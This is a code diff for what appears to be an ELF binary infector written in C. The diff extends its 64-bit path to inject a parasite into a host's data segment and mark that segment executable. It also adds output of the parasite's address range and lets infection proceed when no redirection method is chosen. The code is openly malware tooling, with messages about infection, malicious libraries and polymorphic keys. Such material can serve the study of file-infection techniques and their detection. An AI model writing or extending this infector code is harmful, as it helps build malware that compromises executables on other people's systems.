@@ -18,6 +18,7 @@ int elfit32(opts_t *opts)
     }
     */
 
+    malpoint = 0;
     if (!opts->host)
     {
         return -1;
@@ -99,7 +100,7 @@ int elfit32(opts_t *opts)
                 make_text_writeable32(&host);
             break;
         case DATA_INJECT:
-            printf("[+ INJECTION PARASITE INTO DATA SEGMENT]\n");
+            printf("[+ INJECTING PARASITE INTO DATA SEGMENT]\n");
             printf("chosen injection method not yet implemented\n");
             exit(1);
         case SO_INJECT:
@@ -111,6 +112,8 @@ int elfit32(opts_t *opts)
             printf("chosen injection method not yet implemented\n");
             exit(1);
     }
+
+    printf("[+] Parasite at 0x%lx-0x%lx\n", malpoint, malpoint + parasite.file->st_size);
 
     reload_host(opts->host, &host);
 
@@ -153,7 +156,9 @@ int elfit64(opts_t *opts)
     patch_pos = opts->patch_pos;
     
     load_host(opts->host, &host);
-    load_host(opts->parasite, &parasite);
+
+    if (opts->parasite)
+        load_host(opts->parasite, &parasite);
 
     patch_addr = opts->patch_addr;
     if (!patch_addr)
@@ -186,15 +191,16 @@ int elfit64(opts_t *opts)
                 break;
             default:
                 printf("[-] no redirection method chosen\n");
-                exit(1);
+                printf("continuing infection process\n");
          }
     }
 
     printf("[+ PATCHING PARASITE]\t\tto jump to %08x\n", patch_addr);
-    if (patch_parasite64(&parasite, patch_pos, patch_addr))
-    {
-        printf("out-of-bounds patch position supplied\n");
-    }
+    if (opts->parasite)
+        if (patch_parasite64(&parasite, patch_pos, patch_addr))
+        {
+            printf("out-of-bounds patch position supplied\n");
+        }
 
     if (opts->polymorphic_key)
     {
@@ -228,8 +234,12 @@ int elfit64(opts_t *opts)
             break;
         case DATA_INJECT:
             printf("[+ INJECTION PARASITE INTO DATA SEGMENT]\n");
-            printf("chosen injection method not yet implemented\n");
-            exit(1);
+            malpoint = data_inject_64(&host, &parasite);
+            reload_host(opts->host, &host);
+
+            /* since this is 64 bit we have to make the segment executable */
+            make_data_executable64(&host); 
+            break;
         case SO_INJECT:
             printf("[+ CREATING DEPENDENCY TO MALICIOUS LIBRARY]\n");
             printf("chosen injection method not yet implemented\n");
@@ -238,7 +248,11 @@ int elfit64(opts_t *opts)
             printf("[+ INJECTING RELOCATABLE]\n");
             printf("chosen injection method not yet implemented\n");
             exit(1);
+        default:
+            printf("[-] no injection technique chosen\n");
     }
+
+    printf("[+] Parasite at 0x%lx-0x%lx\n", malpoint, malpoint + parasite.file->st_size);
 
     reload_host(opts->host, &host);
 
